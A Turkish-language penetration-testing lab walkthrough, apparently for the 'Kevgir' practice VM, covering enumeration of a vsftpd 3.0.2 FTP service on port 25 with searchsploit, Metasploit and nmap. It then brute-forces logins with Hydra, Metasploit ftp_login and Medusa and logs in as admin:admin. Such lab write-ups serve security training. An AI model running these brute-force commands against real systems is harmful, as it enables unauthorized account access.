FTP, dosyaların bir ağ üzerinden bir bilgisayardan diğerine taşınmasını sağlayan bir dosya paylaşım protokolüdür. Farklı uygulamalar veya tarayıcılar üzerinden erişim sağlanabilir. Ancak, FTP şifreli bir protokol değildir; şifreli sürümleri olan FTPS veya SFTP mevcuttur.

Kevgir makinesinde 25. porta   vsfpt 3.0.2 veriyonlu ftp sunucusu çalışmaktadır.

Bu çalışan hizmet hakkında bilgi toplayabilmek adına bir çok farklı adım gerçekelştirebiliriz . 


### Exploit-db aracılığyla mevcut sürümde bir exploit olup olmadığı kontrol edilebilir. 
   
```
└──╼ #searchsploit vsfpt
Exploits: No Results
Shellcodes: No Results
```
   
### Metasploit aracılığıyla mevcut sürümde bir exploit olup olmadığı kontrol edilebilir. 
   
```
   Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Executi
```


### Nmap ile alınan çıktı
   
```
25/tcp   open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0
```

### Metasploit aracılığıyla 25. Port taranabilir 
```
└──╼ #msfconsole -q -x "use auxiliary/scanner/ftp/ftp_version; set RHOSTS 10.0.2.10;set RPORT 25; run; exit"
RHOSTS => 10.0.2.10
RPORT => 25
[+] 10.0.2.10:25          - FTP Banner: '220 (vsFTPd 3.0.2)\x0d\x0a'
[*] 10.0.2.10:25          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution complete
```


### Nmap başlığı altında NSE scriptleri hakkında komutlardan bahsetmiştik aşağıda bulunan komut ile mevcut kullanabilecek scriptleri listleler 

```
ls /usr/share/nmap/scripts/ftp-* | grep -o "ftp.*" 
```

```
ftp-anon.nse
ftp-bounce.nse
ftp-brute.nse
ftp-libopie.nse
ftp-proftpd-backdoor.nse
ftp-syst.nse
ftp-vsftpd-backdoor.nse
ftp-vuln-cve2010-4221.nse

```

```
└──╼ #nmap 10.0.2.10 -p 25 --script=ftp-vsftpd-backdoor.nse -sV -sC
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-21 10:08 +03
Nmap scan report for 10.0.2.10
Host is up (0.00093s latency).

PORT   STATE SERVICE VERSION
25/tcp open  ftp     vsftpd 3.0.2
MAC Address: 08:00:27:06:93:DA (Oracle VirtualBox virtual NIC)
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/subm
```


### Username-Parola Brute Force 

Brute force saldırısı için birçok yöntem mevcuttur. Hydra, Medusa veya Metasploit gibi araçlar kullanılabilir. Brute force gerçekleştirebilmek için öncelikle bir wordlist'e ihtiyaç duyulur. metasploit içinde bulunan "http_default_users.txt" dosyasını kullanıcı adı wordlist'i olarak kullanacağım. Parola için ise yine Seclist'ten "http_default_pass.txt" dosyasını tercih edeceğim.

#### Hydra 

```
hydra -L /usr/share/metasploit-framework/data/wordlists/http_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt ftp://10.0.2.10:25 -F
```


```
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-21 11:52:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 266 login tries (l:14/p:19), ~17 tries per task
[DATA] attacking ftp://10.0.2.10:25/
[25][ftp] host: 10.0.2.10   login: admin   password: admin
[STATUS] attack finished for 10.0.2.10 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-21 11:52:
```

#### Metasploit

```
msf6 > use auxiliary/scanner/ftp/ftp_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/http_default_users.txt
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
set RHOSTS 10.0.2.10
set USER_AS_PASS true
run
```

```
[+] 10.0.2.10:25          - 10.0.2.10:25 - Login Successful: admin:admin
```


Medusa 

```
medusa -h 10.0.2.10 -n 25  -U /usr/share/metasploit-framework/data/wordlists/http_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -M ftp
```


```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ACCOUNT CHECK: [ftp] Host: 10.0.2.10 (1 of 1, 0 complete) User: admin (1 of 14, 0 complete) Password: admin (1 of 19 complete)
ACCOUNT FOUND: [ftp] Host: 10.0.2.10 User: admin Password: admin [SUCCESS]
```



### Tespit  edilen kullanıcı bilgileri ile ftp'ye giriş 


```
└──╼ #ftp admin@10.0.2.10 -p 25
Connected to 10.0.2.10.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```